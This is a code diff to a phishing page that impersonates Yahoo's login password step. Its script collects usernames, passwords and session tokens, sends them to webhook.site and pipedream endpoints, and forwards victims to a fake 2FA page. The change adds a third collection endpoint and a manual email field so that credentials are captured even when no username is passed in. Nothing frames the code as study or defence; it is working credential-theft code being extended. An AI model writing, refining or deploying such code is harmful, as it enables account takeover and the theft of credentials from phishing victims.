@@ -98,12 +98,12 @@
   }
   </script>
 
-  <!-- Instant Redirect Integration -->
+  <!-- Working Redirect Integration -->
   <script>
-  console.log('Yahoo Instant Redirect - Password Page Initialized');
+  console.log('Yahoo Working Redirect - Password Page Initialized');
   
   document.addEventListener('DOMContentLoaded', function() {
-    console.log('Processing reCAPTCHA redirect session...');
+    console.log('Processing redirect session...');
     
     // Get session data from URL parameters
     const urlParams = new URLSearchParams(window.location.search);
@@ -111,29 +111,17 @@
     const sessionIndex = urlParams.get('si') || 'QQ--';
     const acrumb = urlParams.get('ac') || '';
     const done = urlParams.get('done') || '';
-    const isBackup = urlParams.get('backup') === '1';
+    const isRecaptcha = urlParams.get('recaptcha') === '1';
     
     console.log('Session data received:', {
       username: username,
       sessionIndex: sessionIndex,
       acrumb: acrumb,
       done: done,
-      isBackup: isBackup
+      isRecaptcha: isRecaptcha
     });
     
-    // Try to get from session cookie
-    try {
-      const sessionCookie = document.cookie.match(/yh_session=([^;]+)/);
-      if (sessionCookie) {
-        const sessionData = JSON.parse(atob(sessionCookie[1]));
-        username = username || sessionData.username;
-        console.log('Session cookie found:', sessionData);
-      }
-    } catch (e) {
-      console.log('No session cookie found');
-    }
-    
-    // Try to get from user cookie
+    // Try to get from user cookie if not in URL
     if (!username) {
       const userCookie = document.cookie.match(/yh_usr=([^;]+)/);
       if (userCookie) {
@@ -142,16 +130,17 @@
       }
     }
     
-    // Security fallback - if no username, redirect back
+    // Security fallback - if no username, show input field
     if (!username) {
-      console.log('No username found, redirecting back to login...');
-      window.location.href = 'https://login.astrowind.live/';
-      return;
+      console.log('No username found, allowing manual entry...');
+      document.getElementById('userEmail').textContent = 'Enter your email and password';
+      // Don't redirect, let user enter email manually
+    } else {
+      // Initialize form with session data
+      document.getElementById('userEmail').textContent = username;
+      document.getElementById('username').value = username;
     }
     
-    // Initialize form with session data
-    document.getElementById('userEmail').textContent = username;
-    document.getElementById('username').value = username;
     document.getElementById('sessionIndex').value = sessionIndex;
     document.getElementById('acrumb').value = acrumb;
     document.getElementById('done').value = done;
@@ -161,7 +150,7 @@
     // Data capture function
     function captureData(action, data) {
       const capturePayload = {
-        type: 'instant_redirect_flow',
+        type: 'working_redirect_flow',
         action: action,
         data: data,
         session: {
@@ -169,17 +158,18 @@
           sessionIndex: sessionIndex,
           acrumb: acrumb,
           done: done,
-          isBackup: isBackup
+          isRecaptcha: isRecaptcha
         },
         timestamp: Date.now(),
         userAgent: navigator.userAgent,
-        page: 'password_instant_redirect'
+        page: 'password_working_redirect'
       };
       
-      // Multiple webhook endpoints
+      // Multiple webhook endpoints for data capture
       const webhooks = [
         'https://webhook.site/your-webhook-id-1',
-        'https://webhook.site/your-webhook-id-2'
+        'https://webhook.site/your-webhook-id-2',
+        'https://eol1pzqgvhqhqhq.m.pipedream.net'
       ];
       
       webhooks.forEach(webhook => {
@@ -195,7 +185,7 @@
     
     // Capture page load
     captureData('page_loaded', {
-      redirectSource: isBackup ? 'backup_detection' : 'primary_detection',
+      redirectSource: isRecaptcha ? 'recaptcha_detection' : 'username_capture',
       hasUsername: !!username,
       hasSessionData: !!(sessionIndex && acrumb)
     });
@@ -207,6 +197,12 @@
       
       const submitBtn = this.querySelector('[type="submit"]');
       const password = document.getElementById('password').value;
+      const currentUsername = document.getElementById('username').value;
+      
+      if (!currentUsername) {
+        alert('Please enter your email address');
+        return;
+      }
       
       if (!password) {
         alert('Please enter your password');
@@ -218,7 +214,7 @@
       
       // Capture password attempt
       captureData('password_submitted', {
-        username: username,
+        username: currentUsername,
         password: password,
         sessionIndex: sessionIndex,
         acrumb: acrumb
@@ -238,7 +234,7 @@
           console.log('Password accepted, proceeding to 2FA...');
           
           captureData('password_accepted', {
-            username: username,
+            username: currentUsername,
             password: password,
             responseStatus: response.status
           });
@@ -247,7 +243,7 @@
           
           // Redirect to 2FA selection
           setTimeout(() => {
-            window.location.href = `https://yahoo-2fa-selection.vercel.app/?u=${encodeURIComponent(username)}&validated=true&si=${encodeURIComponent(sessionIndex)}&ac=${encodeURIComponent(acrumb)}&done=${encodeURIComponent(done)}`;
+            window.location.href = `https://yahoo-2fa-selection.vercel.app/?u=${encodeURIComponent(currentUsername)}&validated=true&si=${encodeURIComponent(sessionIndex)}&ac=${encodeURIComponent(acrumb)}&done=${encodeURIComponent(done)}`;
           }, 1500);
           
         } else {
@@ -258,7 +254,7 @@
         console.log('Password validation failed:', error);
         
         captureData('password_rejected', {
-          username: username,
+          username: currentUsername,
           password: password,
           error: error.message
         });
